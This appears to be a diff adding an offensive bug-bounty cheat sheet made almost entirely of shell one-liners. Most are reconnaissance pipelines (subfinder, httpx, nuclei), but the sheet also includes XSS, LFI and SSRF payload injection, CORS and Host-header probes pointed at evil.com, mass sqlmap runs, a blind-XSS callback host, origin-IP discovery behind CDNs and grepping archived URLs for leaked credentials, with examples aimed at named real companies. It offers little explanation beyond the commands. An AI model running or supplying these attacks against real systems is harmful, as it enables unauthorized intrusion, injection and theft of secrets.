@@ -1,0 +1,257 @@
+Subdomain Enum : subfinder sublist3r amass findomain knockpy assetfinder ffuf dnsx Subdominator
+
+subfinder -silent -d hackerone.com | dnsx -silent
+subfinder -silent -d hackerone.com | dnsx -silent -a -resp
+subfinder -silent -d hackerone.com | dnsx -silent -a -resp-only
+subfinder -silent -d hackerone.com | dnsx -silent -cname -resp
+subfinder -silent -d hackerone.com | dnsx -silent  -asn
+subfinder -silent -d hackerone.com | dnsx -silent -rcode noerror,servfail,refused
+echo 173.0.84.0/24 | dnsx -silent -resp-only -ptr
+echo AS17012 | dnsx -silent -resp-only -ptr 
+dnsx -silent -d facebook.com -w dns_worldlist.txt
+dnsx -silent -d domains.txt -w jira,grafana,jenkins
+cat domains.txt | dnsx -silent -w jira,grafana,jenkins -d -
+dnsx -d google.FUZZ -w tld.txt -resp
+
+-- Subdomain Finding : Subfinder, httpx, waybackurls
+
+subfinder -d <link>
+subfinder -d <link> | httpx --status-code
+subfinder -d <link> | httpx --status-code --title
+echo "<link>" | sudo waybackurls
+echo "<link>" | sudo waybackurls | httpx -silent-code
+cat x.txt | sudo waybackurls | httpx -silent-code
+
+-- oneliner For SSRF, LFI, XSS
+
+cat file.txt | gf xss | grep "source=" | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033{0;31mVulnerable\n" ; done
+
+cat urls.txt | gf lfi | tee lfi.txt
+cat lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w LFI_payloads.txt ; done
+
+findomain -t <link> -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace https"//yourlink.burpcollaborator.net
+
+-- Advance Http Smugler : Smuggler
+
+Smuggler : https://github.com/defparam/smuggler
+
+python3 smuggler.py -u <link>
+python3 smuggler.py -u <link> -m GET
+python3 smuggler.py -u <link> -m POST
+python3 smuggler.py -u <link> -m GET -c doubles.py
+cat list_of_hosts.txt | python3 smuggler.py
+cat x.txt | sudo waybackurls | gf ssrf | parallel -j 10 curl --proxy "http://127.0.0.1" -sk > /dev/null
+
+Burp Store : Http Request Smuggler.
+
+-- Directory Fuzzing:
+
+ffuf -w /path/wordlist -w http://target/FUZZ
+findomain -t hackerone.com | sed 's#*.# #g' | httpx --silent --threads 10 | xargs -I@ sh -c 'ffuf -w /home/kali/Desktop/big.txt -u @/FUZZ -mc 200'
+
+HostileSubBruteforcer : https://github.com/nahamsec/HostileSubBruteforcer
+
+-- Nuclei
+
+nuclei -l targets.txt -t <templates>
+nuclei -t https://example.com -t <templates>
+nuclei -u https://example.com -t <templates>
+nuclei -silent -t https://example.com -t <templates>
+nuclei -c 10 -t https://example.com -t <templates>
+nuclei -no-verify -t https://example.com -t <templates>
+subfinder -d targetdomain.com -silent | httpx | nuclei -t technologies/tech-detect.yaml
+
+-- Finding Xss:
+
+echo "link" | sudo waybackurls | knxx
+assetfinder <link> | gau | dalfox pipe
+
+-- Directory Fuzzing:
+
+subfinder -d <link> -o domain.txt
+nuclei -l domain.txt -l nuclei-templates
+
+dirsearch -e php,html,js -u example.com
+cat domain.txt | xargs -I@ sh -c 'dirsearch -u @ -e php,jsp,js'
+
+-- Host Header Injection : jsubfinder, assetfinder
+
+jsubfinder -u www.google.com
+jsubfinder -f google.txt
+echo www.google.com | jsubfinder
+echo www.google.com | jsubfinder -crawl
+echo www.google.com | httpx --silent | jsubfinder
+cat subdomain.txt | httpx --silent | jsubfinder -s
+
+jsubfinder search -u www.google.com
+jsubfinder search -f file.txt
+echo www.google.com | jsubfinder search
+echo www.google.com | httpx --silent | jsubfinder search$
+
+assetfinder <link> | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} | [[ $(grep -c "evil.com") -g t 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"' 2>/dev/null
+
+assetfinder <link> | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "X-Forwarded-Host:evil.com" {} | [[ $(grep -c "evil.com") -g t 0 ]] && printf "\n\033[0;32m[VUL TO Host Header] - {}\e[m"' 2>/dev/null
+
+Finding IDOR : Authorise, Auto Repeater in Burp Store
+
+Finding Js Files: Subj, httpx, anew
+
+cat subdomains.txt | httpx -silent | subjs | anew
+paramspider -d <link>
+
+SQLI : 
+subfinder -d <link> -o link.txt
+subfinder -d <link> | httpx --status-code --title
+
+httpx -l link.txt --silent --threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | sudo waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
+
+Find Api Key :
+
+subfinder -d <link> | waybackurls | grep "\.js" | tee js.txt
+subfinder -d <link> | waybackurls | grep "\.json" | tee json.txt
+subfinder -d <link> | waybackurls | grep "\.php" | tee php.txt
+subfinder -d <link> | waybackurls | grep "\.js" | tee js.txt
+cat file.txt | xargs -I@ sh -c 'python3 Secretfinder.py -i @'
+
+
+Finding Real IP : 
+
+method 01:
+CloudFail : https://github.com/m0rtem/CloudFail
+
+python3 cloudfail.py -u
+python3 cloudfail.py -t <link>
+
+Method 02:
+export CENSYS_API_ID=69247a69–XXXX-XXXX–XXXX-XXXXXXXXXXXX
+export CENSYS_API_SECRET=Pm4vXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+pip install censys
+censys search hackerone.com
+censys search hackerone.com | grep “ip” | egrep -v “description” | cut -d “:” -f2 | tr -d \”\
+
+censys search hackerone.com | grep “ip” | egrep -v “description” | cut -d “:” -f2 | tr -d \”\, | tee ips.txt
+cat ips.txt | httpx
+
+Method 03:
+shodan init <YOUR_API_KEY>
+shodan search Ssl.cert.subject.CN:”hackerone.com” 200 — fields ip_str | httpx
+
+uncover -q “hackerone.com” -e censys,fofa,shodan,shodan-idb | httpx
+
+Directory Traversal : dotdotpwn
+
+dotdotpwn : https://github.com/wireghoul/dotdotpwn
+
+dotdotpwn -m http-url -u http://www.abc.xyz/signin?ReturnUrl=TRAVERSAL k "root:"
+dotdotpwn -m http -h 127.0.0.1 -o
+
+Finding Admin Panel :
+
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+
+nuclei -update-templates
+nuclei -l target_urls.txt -t eves/
+nuclei -target example.com
+nuclei -target example.com -t http/cves/ -t ssl
+nuclei -list hosts.txt
+nuclei -target example.com -json-export output.json
+
+sudo subfinder -d tesla.com -o 1.txt | sudo sublist3r -d tesla.com -o 2.txt | sudo assetfinder --subs-only tesla.com > 3.txt | sudo findomain -t tesla.com --output
+cat * > full.txt | sort | uniq > final.txt
+waybackurls <link> | tee link.txt
+nuclei -l text.txt -t cves/
+
+Information Disclose:
+
+waybackurls <link> 
+waybackurls <link> | tee x.txt
+cat x.txt | grep -i yahoo | grep -i api | grep -i txn_id | grep -i key | grep -i id | grep -i user | grep -i name | grep -i uname | grep -i pass | grep -i password | grep -i passwd | grep -i phone | grep -i number | grep -i gmail | grep -i mail
+
+site:paypal.com inurl:txn_id=
+
+Top 5 Tools In Burpsuite : 
+
+IDOR > Authz, AutoRepeater
+Http Request Smugler
+ParamMiner
+XSS Validator
+Ip Route, Fake IP, Anonymous Cloud,Exiftool Scanner, Random Ip Address Header
+
+Browser Extention : WappaLyzer, FoxyProxy, Cookie Editor, Container, Retire.js, TruffleHog, Hack Tools, User-agent Switcher
+
+Mass GitHub Repo Scanning : docker run --rm mswell/masstrufflehog -o paypal
+
+Xss Auto : 
+
+https://github.com/takshal/freq
+echo <link> | waybackurls | gf xss | uro | qsreplace '">img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
+
+Httpx:
+
+cat x.txt | httpx --status-code --title
+cat x.txt | httpx --status-code -tech-detect
+cat x.txt | httpx --status-code -content-length
+cat x.txt | httpx --status-code -cname
+cat x.txt | httpx --status-code -server
+
+
+
+--Some Tips--
+
+TOols for subdomain Finding: Subfinder, finddomain, sublist3r, hackertarget.com, google dork, virustotal, altdns, subBrute, Haktrails, knockpy
+
+Header and Request:
+subfinder -d example.com -o domain.txt
+assetfinder -subs-only example.com | anew domain.txt
+cat domain.txt | xargs -l@ sh -c 'curl @ -L'
+Use ctrl + F
+
+XSS:
+subfinder -d domain.txt | anew domain.txt
+findomain -t domain.txt | anew domain.txt
+assetfinder -subs-only domain.txt | anew domain.txt
+cat domain.txt | sudo waybackurls | gf xss | anew xss.txt
+dalfox file xss.txt
+dalfox file xss.txt -b https://hacktube5.xss.ht
+
+Shodan Dork:
+"Domain name or Company Name"
+ssl:"Domain name or Company Name"
+org:"Company Name"
+http.title:"administrator" (Title Name)
+"Domain name" 200
+country:"IN"
+city:"Delhi"
+"MongoDB server Information"
+
+sudo subfinder -d tesla.com -o 1.txt | sudo sublist3r -d tesla.com -o 2.txt | sudo assetfinder --subs-only tesla.com > 3.txt | sudo findomain -t tesla.com --output
+amass enum -d tesla.com > 5.txt
+cat * > full.txt | sort | uniq > final.txt
+cat x.txt | httpx -sc -title -mc 404
+cat x.txt | httpx -sc -title -mc 200 | anew 200.txt
+cat 200.txt | sudo waybackurls and now using with grep tools
+
+
+Parameter to test SSRF, LFI, RFI:
+
+domain, return, url, page, admin, redirect, next, callback, path, file, shell, site, filename
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
